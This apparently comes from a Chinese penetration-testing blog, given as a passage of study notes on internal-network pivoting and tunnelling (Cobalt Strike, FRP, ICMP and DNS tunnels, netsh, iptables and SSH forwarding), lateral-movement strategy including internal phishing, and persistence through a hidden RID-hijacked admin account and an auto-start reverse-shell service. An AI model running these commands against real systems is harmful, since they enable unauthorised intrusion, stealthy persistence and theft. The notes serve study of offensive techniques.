                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213429129.png"
                      alt="image-20230808213429129"
                ></p>
<p>主机添加代理服务，address是主机的IP地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213528410.png"
                      alt="image-20230808213528410"
                ></p>
<p>然后设置规则，目标主机机需要上线的主机，选择刚才添加好的Action</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213724414.png"
                      alt="image-20230808213724414"
                ></p>
<p>在开启一个监听，为正向监听，端口设置为2222</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214021093.png"
                      alt="image-20230808214021093"
                ></p>
<p>生成正向木马Windows executable(s)，选择新建立的监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213942189.png"
                      alt="image-20230808213942189"
                ></p>
<p>上传生成的木马到靶机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214411864.png"
                      alt="image-20230808214411864"
                ></p>
<p>此时运行是不会上线的</p>
<p>但是在刚才开启端口的窗口运行connect 目标主机IP  2222（监听端口）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808215127079.png"
                      alt="image-20230808215127079"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214339161.png"
                      alt="image-20230808214339161"
                ></p>
<p>即可上线目标主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214520912.png"
                      alt="image-20230808214520912"
                ></p>
<h4 id="通信逻辑"><a href="#通信逻辑" class="headerlink" title="通信逻辑"></a>通信逻辑</h4><p>攻击机—socks4a—&gt;CS（cs负责开启socks代理服务1234端口）&lt;—上线（http&#x2F;https）—&gt;内网主机</p>
<p>条件：sleep调整为0</p>
<h3 id="MSF（不常用）"><a href="#MSF（不常用）" class="headerlink" title="MSF（不常用）"></a>MSF（不常用）</h3><h4 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h4><p>msf会话：route[add&#x2F;remove]subnet netmask [comm&#x2F;sid]</p>
<p>Meterpreter会话：run autoroute [-r] -s subnet -n netmask</p>
<h4 id="开启代理服务"><a href="#开启代理服务" class="headerlink" title="开启代理服务"></a>开启代理服务</h4><p>use auxiliary&#x2F;server&#x2F;socks4a</p>
<p>use auxiliary&#x2F;server&#x2F;socks5</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807140351823.png"
                      alt="image-20230807140351823"
                ></p>
<h3 id="FRP反向代理"><a href="#FRP反向代理" class="headerlink" title="FRP反向代理"></a>FRP反向代理</h3><p>在frp客户端配置的时候需要开启tls这样比较隐蔽</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开启tls</span><br><span class="line">tls_enable=True</span><br></pre></td></tr></table></figure></div>

<p>环境提要：服务端kali：192.168.81.135      客户端win7：192.168.81.161</p>
<p>服务端配置frps.ini</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202630911.png"
                      alt="image-20230808202630911"
                ></p>
<p>客户端配置frpc.ini，remote_port&#x3D;9000表示远程的连接端口是9000</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202712920.png"
                      alt="image-20230808202712920"
                ></p>
<p>服务端开启监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202941052.png"
                      alt="image-20230808202941052"
                ></p>
<p>客户端运行frpc.ini</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203028506.png"
                      alt="image-20230808203028506"
                ></p>
<p>服务端收到响应</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203051929.png"
                      alt="image-20230808203051929"
                ></p>
<p>此时就将客户端的192.168.81.161:3389端口转发到服务端的192.168.81.135:9000端口了</p>
<p>所以可以直接利用服务端IP+端口连接RDP</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203317835.png"
                      alt="image-20230808203317835"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203346583.png"
                      alt="image-20230808203346583"
                ></p>
<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p>nps.conf存在未授权，需要将auth_key和auto_crypt注释去掉并且在后面加几个自己的字符，避免被别人连接</p>
<p>挂nps代理扫端口，不准确是显示任何端口都开放，用不了，而frp不会，会显示真实的端口开放情况</p>
<p>frp和nps有什么区别：本质上是没有区别的，就是使用习惯上的问题，nps偏向于web页面的管理，frp就是配置文件，偏向命令行</p>
<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>ICMP是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息</p>
<p>控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身消息</p>
<p>协议带有Message Body，利用该部分实现信息传递</p>
<h4 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h4><p>利用pingtunnel工具</p>
<p>pingtunnel是吧tcp&#x2F;udp&#x2F;socks5流量伪装成icmp流量进行转发的工具</p>
<p>需要root&#x2F;administrator权限</p>
<p>服务端配置：.&#x2F;pingtunnel -type server</p>
<p>客户端配置：</p>
<p>pingtunnel.exe -type client -l:4455 -s vps -sock5 1</p>
<p>pingtunnel.exe -type client -l:4455 -s vps -t internet:4455 -tcp 1</p>
<p>作用：tcp不出网时在本地开启代理&#x2F;端口转发将tcp转成icmp出网，可以用于cs上线或者反向隧道搭建</p>
<h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>服务端开启监听</p>
<p>.&#x2F;pingtunnel -type server</p>
<p>客户端连接服务端，本地监听4455端口，模式为socks5模式</p>
<p>pingtunnel.exe -type client -l :4455 -s vps -sock5 1</p>
<p> 端口转发服务，将服务端的某个服务端口转发到本地</p>
<p>pingtunnel.exe -type client -l:4455 -s vps -t internet（服务端IP）:4455 -tcp 1</p>
<p>实战操作，将服务端的ssh端口映射到本地</p>
<p>pingtunnel.exe -type client -l:4455 -s cctest(vps) -t cctest:22 -tcp 1</p>
<p>本地执行</p>
<p>ssh <a class="link"   href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49;" >&#x72;&#111;&#111;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -p 4455这一步就可以连接到vps的ssh</p>
<h3 id="UDP隧道（了解）"><a href="#UDP隧道（了解）" class="headerlink" title="UDP隧道（了解）"></a>UDP隧道（了解）</h3><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><h4 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h4><h5 id="通配DNS解析网址（没有域名可以用）"><a href="#通配DNS解析网址（没有域名可以用）" class="headerlink" title="通配DNS解析网址（没有域名可以用）"></a>通配DNS解析网址（没有域名可以用）</h5><p>xip.io、nip.io、sslip.io</p>
<h5 id="主要作用"><a href="#主要作用" class="headerlink" title="主要作用"></a>主要作用</h5><p>免配置DNS解析</p>
<p>使用CNAME绕过域名实名备案</p>
<p>10.0.0.1.xip.io——–&gt;10.0.0.1</p>
<p><a href="http://www.10.0.0.1.xip.io------->10.0.0.1">www.10.0.0.1.xip.io-------&gt;10.0.0.1</a></p>
<p>mysite.10.0.0.1.xip.io——-&gt;10.0.0.1</p>
<p>foo.bar.10.0.0.1.xip.io——-&gt;10.0.0.1</p>
<h4 id="DNS隧道前置条件"><a href="#DNS隧道前置条件" class="headerlink" title="DNS隧道前置条件"></a>DNS隧道前置条件</h4><h5 id="域名服务器指向自己的服务器"><a href="#域名服务器指向自己的服务器" class="headerlink" title="域名服务器指向自己的服务器"></a>域名服务器指向自己的服务器</h5><p>确保所有DNS解析流量都经过自己的VPS服务器</p>
<h5 id="服务器开启UDP-53端口"><a href="#服务器开启UDP-53端口" class="headerlink" title="服务器开启UDP 53端口"></a>服务器开启UDP 53端口</h5><p>确保根域名服务器能够及时发送DNS解析流量到自己服务器</p>
<h4 id="正向DNS隧道"><a href="#正向DNS隧道" class="headerlink" title="正向DNS隧道"></a>正向DNS隧道</h4><p>使用DNS2TCP结合SSH隧道建立DNS隧道</p>
<p>安装DNS2TCP</p>
<p>服务器使用DNS2TCPD加载配置文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns2tcpd -f dns2tcp.conf -F -d 2</span><br></pre></td></tr></table></figure></div>

<p>客户端使用DNS2TCPC将远程端口转发到本地</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns2tcpc -c -r ssh -l 26666 -d 4 -z tunnel.evevnote.com -k nsfo123</span><br></pre></td></tr></table></figure></div>

<p>使用SSH打通Socks5隧道</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg root@127.0.0.1 -p 26666 -D 26667</span><br></pre></td></tr></table></figure></div>

<p>TCP-over-DNS工具，可以看一看，很老的工具</p>
<h4 id="反向DNS隧道"><a href="#反向DNS隧道" class="headerlink" title="反向DNS隧道"></a>反向DNS隧道</h4><p>DNSCat2</p>
<h3 id="端口转发-1"><a href="#端口转发-1" class="headerlink" title="端口转发"></a>端口转发</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>需要管理员权限</p>
<p>通过一系列的配置或软件，将访问端口A的流量转发到端口B上，端口A和B可以为本地端口，也可以为远程端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows-----常用软件netsh</span><br><span class="line">Linux-----iptables SSH Ptunnel dns2tcp  DNSCat2等</span><br><span class="line">跨平台-----EW Terminal FRP NPS Icx portforward等</span><br></pre></td></tr></table></figure></div>

<p>端口转发常用于网段之间的跳跃，即将搭建好的隧道端口转发出来</p>
<p>大多数的端口转发场景都可以使用操作系统自带的网络配置软件实现</p>
<p>有许多优势：无需落地软件配置即可、杀毒软件白名单、不用开启新进程、稳定可靠、不易被管理员发现</p>
<h5 id="场景提要"><a href="#场景提要" class="headerlink" title="场景提要"></a>场景提要</h5><p>已经进入DMZ或者二层DMZ了但是核心区需要用办公网络进去，但是办公网络做了限制代理隧道进不去，这时候就可以通过端口转发将核心区端口转发到办公区</p>
<p>1.映射本地服务</p>
<p>实际场景中可能会遇到：内网策略禁止访问3389端口时，需要做端口转发</p>
<p>将本地的3389端口转发到本地80端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=80 connectaddress=127.0.0.1 connectport=3389</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808210803597.png"
                      alt="image-20230808210803597"
                ></p>
<p>2.映射远程服务</p>
<p>实际场景：只能通过跳板机去访问对应服务</p>
<p>192.168.113.131是被控网络的内网资源，仅能通过192.168.113.130来访问</p>
<p>将192.168.113.131的ssh服务（22端口）映射到192.168.113.130的2222端口</p>
<p>效果是连接192.168.113.130:2222实际上是连接192.168.113.131:22(SSH)</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=2222 connectaddress=192.168.113.131 connectport=22</span><br></pre></td></tr></table></figure></div>

<p>我的场景是将一台主机192.168.81.161的3389转发到另一台主机192.168.81.138的2222端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211634009.png"
                      alt="image-20230808211634009"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211640410.png"
                      alt="image-20230808211640410"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211732930.png"
                      alt="image-20230808211732930"
                ></p>
<p>3.目标：映射远程的192.168.235.22:1234服务到本地的2345端口</p>
<p>远程IP地址：192.168.235.22</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=2345 connectaddress=192.168.235.22 connectport=1234</span><br></pre></td></tr></table></figure></div>





<p>查询端口转发的情况</p>
<p>netsh interface portproxy show v4tov4</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808212150494.png"
                      alt="image-20230808212150494"
                ></p>
<p>删除端口转发</p>
<p>netsh interface portproxy delete v4tov4 40050</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808212221892.png"
                      alt="image-20230808212221892"
                ></p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>Linux需要开启端口转发功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br><span class="line">#将net.ipv4.ip_forward=0更改为net.ipv4.ip_forward=1</span><br><span class="line">sysctl -p</span><br><span class="line">#使数据转发功能生效</span><br></pre></td></tr></table></figure></div>

<p>删除规则</p>
<p>查看链条</p>
<p>iptables -t nat -nvL</p>
<p>iptables -t nat –list –line-number 有编号的就不用数了</p>
<p>1 删除DNAT</p>
<p>iptables -t nat -D PREROUTING 1</p>
<p>2 删除SNAT</p>
<p>iptables -t nat -D POSTROUTING 1</p>
<h5 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h5><p>1.将外网访问192.168.113.131:8443端口&lt;—-转发到192.168.8.1:80需要添加两条</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#DNAT</span><br><span class="line">iptables -t nat -A PREROUTING -d 192.168.113.131 -p tcp --dport 8443 -j DNAT --to-destination 192.168.8.1:80</span><br><span class="line">#SNAT</span><br><span class="line">iptables -t nat -A POSTROUTING -d 192.168.8.1 -p tcp --dport 80 -j SNAT --to 192.168.113.131</span><br></pre></td></tr></table></figure></div>

<p>2.转发CS监听（Linux出网其他服务器不出网，但要上线CS）</p>
<p>iptables -t nat -A PREROUTING -d 192.168.113.131 -p tcp –dport 8443 -j DNAT –to-destination vps的IP:port</p>
<p>iptables -t nat -A POSTROUTING -d （vps的IP） -p tcp –dport （vps的端口） -j SNAT –to 192.168.113.131</p>
<p>然后CS上面创建监听就可以用192.168.113.131（内网主机的IP了）然后就可以在内网主机运行直接上线CS</p>
<p>3.转发FRP</p>
<h2 id="正向代理-端口转发"><a href="#正向代理-端口转发" class="headerlink" title="正向代理+端口转发"></a>正向代理+端口转发</h2><h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><p>需要更改VPS sshd配置文件，开启端口转发：GatewayPorts yes</p>
<p>动态转发 -D（开启socks5服务）</p>
<p>本地转发 -L（把远程某个端口转发到本地某端口上）</p>
<p>远程转发 -R（把本地某端口转发到远程某端口上）</p>
<h4 id="通过SSH建立内网隧道"><a href="#通过SSH建立内网隧道" class="headerlink" title="通过SSH建立内网隧道"></a>通过SSH建立内网隧道</h4><h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>需要root权限</p>
<p>需要自己控制一台公网VPS</p>
<p>需要更改VPS sshd配置文件，开启端口转发：GatewayPorts yes</p>
<p>重启SSH服务：systemctl  restart sshd.service (service sshd status—-&gt;service sshd restart)</p>
<h4 id="SSH隧道搭建"><a href="#SSH隧道搭建" class="headerlink" title="SSH隧道搭建"></a>SSH隧道搭建</h4><p>查看配置是否成功修改</p>
<p>cat  &#x2F;etc&#x2F;sshd_config</p>
<p>cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config             ubuntu</p>
<h5 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h5><p>1.ssh开启socks5服务</p>
<p>ssh -qTfnN -D 0.0.0.0:监听端口 root@localhost</p>
<p>ssh -qTfnN -D 0.0.0.0:21080 root@localhost</p>
<p>ssh -qTfnN -R 0.0.0.0:31080(vps):0.0.0.0:1080 root@cctest</p>
<p>ssh -qTfnN -L 0.0.0.0:1080:0.0.0.0:31080(vps) root@cctest</p>
]]></content>
  </entry>
  <entry>
    <title>内网横向</title>
    <url>/2024/02/29/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/</url>
    <content><![CDATA[<h1 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h1><p>在通过信息收集和漏洞利用之后，可以在内网中获取到一定数量的权限，但是在内网中必须要扩大战果</p>
<p>其中最重要的是定位靶标与重大成果的能力</p>
<h2 id="扩大战果"><a href="#扩大战果" class="headerlink" title="扩大战果"></a>扩大战果</h2><p>寻找一些出网主机，搭建C2&#x2F;代理，关注远控与VPN账号后门增加内网驻留时间</p>
<p>寻找多网卡主机，可以同时与外网和内网通信，突破网段隔离</p>
<h3 id="主机权限"><a href="#主机权限" class="headerlink" title="主机权限"></a>主机权限</h3><h4 id="网段信息"><a href="#网段信息" class="headerlink" title="网段信息"></a>网段信息</h4><p>要收集本地的网段信息，利用网段信息做资产探测</p>
<h4 id="收集密码"><a href="#收集密码" class="headerlink" title="收集密码"></a>收集密码</h4><p>利用口令碰撞获取到一些主机、web、数据库权限</p>
<h5 id="主机权限-1"><a href="#主机权限-1" class="headerlink" title="主机权限"></a>主机权限</h5><p>继续收集这一台的主机密码，进行循环的扩大战果</p>
<h5 id="Web权限"><a href="#Web权限" class="headerlink" title="Web权限"></a>Web权限</h5><p>关注一些集权管理平台（360天擎、堡垒机等）这些平台是可以直接管控内网的主机的，可以获取这个主机权限，然后进一步回退到扩大战果，继续利用</p>
<h5 id="数据库权限"><a href="#数据库权限" class="headerlink" title="数据库权限"></a>数据库权限</h5><p>利用获取到的数据权限，进行数据库提权获取到主机权限，进一步循环到扩大战果步骤</p>
<h4 id="Web-x2F-系统漏洞"><a href="#Web-x2F-系统漏洞" class="headerlink" title="Web&#x2F;系统漏洞"></a>Web&#x2F;系统漏洞</h4><p>获取主机权限—-扩大战果</p>
<h4 id="远程运维软件"><a href="#远程运维软件" class="headerlink" title="远程运维软件"></a>远程运维软件</h4><p>用于创建后门</p>
<h3 id="Web权限-1"><a href="#Web权限-1" class="headerlink" title="Web权限"></a>Web权限</h3><p>可以通过防火墙或者VPN 管理，来添加VPN账号，延长在内网的驻留时间</p>
<h2 id="定位靶标"><a href="#定位靶标" class="headerlink" title="定位靶标"></a>定位靶标</h2><p>在内网横向中，重点要摸清单位网络&#x2F;组织架构，运维研发人员的信息，绘制内网拓朴图挂图作战</p>
<p>目的是突破核心区域，生产区域，专网等强逻辑隔离区域</p>
<p>侧重攻击虚拟化、堡垒机等集权平台，以及文档协作平台，邮件服务这些重要的业务系统，争取获取重大成果，少绕弯路</p>
<p>场景是在已经拿到一定权限的基础上进行的</p>
<h3 id="主机权限-2"><a href="#主机权限-2" class="headerlink" title="主机权限"></a>主机权限</h3><h4 id="个人-x2F-运维-x2F-研发PC"><a href="#个人-x2F-运维-x2F-研发PC" class="headerlink" title="个人&#x2F;运维&#x2F;研发PC"></a>个人&#x2F;运维&#x2F;研发PC</h4><h5 id="网络架构-x2F-敏感文档-x2F-密码信息"><a href="#网络架构-x2F-敏感文档-x2F-密码信息" class="headerlink" title="网络架构&#x2F;敏感文档&#x2F;密码信息"></a>网络架构&#x2F;敏感文档&#x2F;密码信息</h5><p>在某些情况下，获取到一些敏感文档就有一定的可能可以直接获取到靶标系统的权限</p>
<h6 id="突破强隔离"><a href="#突破强隔离" class="headerlink" title="突破强隔离"></a>突破强隔离</h6><p>收集一些VPN相关以及远控运维软件的信息，来突破强隔离限制</p>
<h6 id="运维区域-x2F-业务区域-x2F-核心区域"><a href="#运维区域-x2F-业务区域-x2F-核心区域" class="headerlink" title="运维区域&#x2F;业务区域&#x2F;核心区域"></a>运维区域&#x2F;业务区域&#x2F;核心区域</h6><p>可以利用这些信息直接进入这些区域</p>
<p>主要涉及到云盘、文档协作平台</p>
<h5 id="运维区域-x2F-业务区域-x2F-核心区域-1"><a href="#运维区域-x2F-业务区域-x2F-核心区域-1" class="headerlink" title="运维区域&#x2F;业务区域&#x2F;核心区域"></a>运维区域&#x2F;业务区域&#x2F;核心区域</h5><h6 id="云盘"><a href="#云盘" class="headerlink" title="云盘"></a>云盘</h6><h6 id="文档协作平台"><a href="#文档协作平台" class="headerlink" title="文档协作平台"></a>文档协作平台</h6><p>可以这些文档平台去寻找一些账号密码—–可以反作用于网络架构&#x2F;敏感文档&#x2F;密码信息</p>
<h6 id="集权管理平台"><a href="#集权管理平台" class="headerlink" title="集权管理平台"></a>集权管理平台</h6><p>这些平台可以直接定位到个人&#x2F;运维&#x2F;研发PC</p>
<p>或者直接到达靶标系统</p>
<h6 id="代码托管平台"><a href="#代码托管平台" class="headerlink" title="代码托管平台"></a>代码托管平台</h6><p>可以获取到代码信息，进行代码审计，利用漏洞等进入靶标系统</p>
<h4 id="运维-x2F-研发服务器"><a href="#运维-x2F-研发服务器" class="headerlink" title="运维&#x2F;研发服务器"></a>运维&#x2F;研发服务器</h4><h6 id="代码编译服务器"><a href="#代码编译服务器" class="headerlink" title="代码编译服务器"></a>代码编译服务器</h6><p>获取到代码信息，代码审计，进一步利用漏洞获取到靶标系统</p>
<h6 id="堡垒机前置机"><a href="#堡垒机前置机" class="headerlink" title="堡垒机前置机"></a>堡垒机前置机</h6><p>直接可以获取到堡垒机的登陆信息，就相当于获取到其他受该堡垒机管控主机的权限</p>
<h6 id="运维区域-x2F-业务区域-x2F-核心区域-x2F-个人-x2F-运维-x2F-研发PC"><a href="#运维区域-x2F-业务区域-x2F-核心区域-x2F-个人-x2F-运维-x2F-研发PC" class="headerlink" title="运维区域&#x2F;业务区域&#x2F;核心区域&#x2F;个人&#x2F;运维&#x2F;研发PC"></a>运维区域&#x2F;业务区域&#x2F;核心区域&#x2F;个人&#x2F;运维&#x2F;研发PC</h6><p>或许也可以获取到这些区域的权限，反哺上面的操作</p>
<h4 id="多网卡主机"><a href="#多网卡主机" class="headerlink" title="多网卡主机"></a>多网卡主机</h4><p>利用多网卡的主机可能可以直接跨界到</p>
<p>办公区域—-以此获取到个人&#x2F;运维&#x2F;研发的PC</p>
<p>运维区域&#x2F;业务区域&#x2F;核心区域</p>
<p>公司专网&#x2F;集团专网&#x2F;政务专网&#x2F;政务外网—继续进行扩大战果</p>
<p>这取决于该主机是什么身份</p>
<h4 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h4><p>由于K8s组件配置不当</p>
<p>通过K8s集群获取到靶标系统</p>
<p>可以部署恶意容器逃逸—-以此进去到运维&#x2F;业务&#x2F;核心区域</p>
<h3 id="Web权限-2"><a href="#Web权限-2" class="headerlink" title="Web权限"></a>Web权限</h3><h4 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h4><p>通过通讯录定位重要人员</p>
<h6 id="翻找邮箱"><a href="#翻找邮箱" class="headerlink" title="翻找邮箱"></a>翻找邮箱</h6><p>获取到一些网络架构&#x2F;敏感文档&#x2F;密码信息</p>
<h6 id="内部邮箱精确钓鱼"><a href="#内部邮箱精确钓鱼" class="headerlink" title="内部邮箱精确钓鱼"></a>内部邮箱精确钓鱼</h6><p>获取到个人&#x2F;运维&#x2F;研发人员的主机权限</p>
<h4 id="OA办公系统"><a href="#OA办公系统" class="headerlink" title="OA办公系统"></a>OA办公系统</h4><h6 id="水坑钓鱼"><a href="#水坑钓鱼" class="headerlink" title="水坑钓鱼"></a>水坑钓鱼</h6><p>发布一些公告，诱导人员点击获取权限</p>
<p>获取到一些运维、研发人员的PC权限</p>
<h6 id="通讯录爆破"><a href="#通讯录爆破" class="headerlink" title="通讯录爆破"></a>通讯录爆破</h6><p>可以进一步利用邮箱进行钓鱼或者翻找敏感文件</p>
<h4 id="智能客服系统"><a href="#智能客服系统" class="headerlink" title="智能客服系统"></a>智能客服系统</h4><p>进入运维&#x2F;业务&#x2F;核心区域</p>
<h4 id="集团门户导航"><a href="#集团门户导航" class="headerlink" title="集团门户导航"></a>集团门户导航</h4><p>如果我们不知道一些公司网址，可以寻找集团门户导航，获取到IP段，定位靶标</p>
<h3 id="数据库权限-1"><a href="#数据库权限-1" class="headerlink" title="数据库权限"></a>数据库权限</h3><h4 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h4><h6 id="口令复用"><a href="#口令复用" class="headerlink" title="口令复用"></a>口令复用</h6><p>利用口令复用突破VPN限制，进入运维&#x2F;业务&#x2F;核心区域</p>
<h6 id="加密口令替换"><a href="#加密口令替换" class="headerlink" title="加密口令替换"></a>加密口令替换</h6><p>对加密口令进行替换，替换数据库进行登陆 ，获取进入运维&#x2F;业务&#x2F;核心区域</p>
<p>具体操作可前往”内网安全“文章阅读^_^&#x2F;</p>
]]></content>
  </entry>
  <entry>
    <title>内网权限持久化</title>
    <url>/2023/05/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    <content><![CDATA[<p>当获得到服务器的控制权后，为了防止服务器管理员发现和修补漏洞而导致的服务器权限的丢失，往往需要采取一些手段来实现对目标服务器的持久化访问</p>
<h2 id="常见的系统后门技术"><a href="#常见的系统后门技术" class="headerlink" title="常见的系统后门技术"></a>常见的系统后门技术</h2><h3 id="创建影子账户"><a href="#创建影子账户" class="headerlink" title="创建影子账户"></a>创建影子账户</h3><p>影子账户—隐藏的账户，无论怎样都看不到。只有在注册表中才能看到信息</p>
<h6 id="创建影子账户实践"><a href="#创建影子账户实践" class="headerlink" title="创建影子账户实践"></a>创建影子账户实践</h6><p>1.在目标主机中输入以下命令，创建一个名为Hacker$的账户</p>
<p><code>net user Hacker$ hacker@123 /add                #创建隐藏账户Hacker$</code></p>
<p>其中“$”符号表示隐藏用户的意思，利用命令行无法查看，但是在“控制面板”“计算机管理”等仍然能看到</p>
<p>且此时这个用户是标准用户，需要进入注册表修改使其成为管理员用户</p>
<p>2.在注册表编辑器中定位到HKEY_LOCAL_MACHINE\SAM\SAM\右键单击，选择‘权限’命令，将Administrator用户的权限设置为完全控制</p>
<p>这是由于注册表项的内容在标准用户和管理员用户下都是不可见的</p>
<p>3.在注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Accout\Users\Names，处选择Administrator用户在左侧找到与右边显示的键值的类型“0x1f4”相同的目录名，即000001F4，复制000001F4中F文件的值</p>
<p>4.同理，找到隐藏账户的Hacker$相应的目录000003EA ，将他复制的000001F4中的F的值粘贴到他的F中，确认</p>
<p>原理是：隐藏用户劫持了管理员账户的的RID，从而使Hacker$具有管理员权限</p>
<p>5.分别选中Hacker$和00003EA并导出，然后运行<code>net user Hacker$ /del</code> 删除</p>
<p>之后再将导出的注册表到入回去即可</p>
<h3 id="系统服务后门"><a href="#系统服务后门" class="headerlink" title="系统服务后门"></a>系统服务后门</h3><p>主要原理就是测试人员将对于“自动”的系统服务，测试人员可以将这种服务的启动二进制文件路径改为攻击荷载或者后门程序，当系统和服务重启的时候就可以重新启动，但是得需要管理员权限</p>
<p>系统服务会自启，所以将路径攻击载荷的路径，服务启动时就会启动攻击载荷</p>
<h6 id="1-创建系统服务"><a href="#1-创建系统服务" class="headerlink" title="1.创建系统服务"></a>1.创建系统服务</h6><p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create Backdoor binpath= &quot;cmd.exe /K C:\Windows\System32\reverse_tcp.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;</span><br><span class="line">binpath后面必须有空格   obj指定运行权限   start指定启动类型</span><br></pre></td></tr></table></figure></div>

<p>reverse_tcp.exe这个利用msf生成并通过shell后门上传，一旦系统服务启动就会连带启动木马后门，实现权限维持</p>
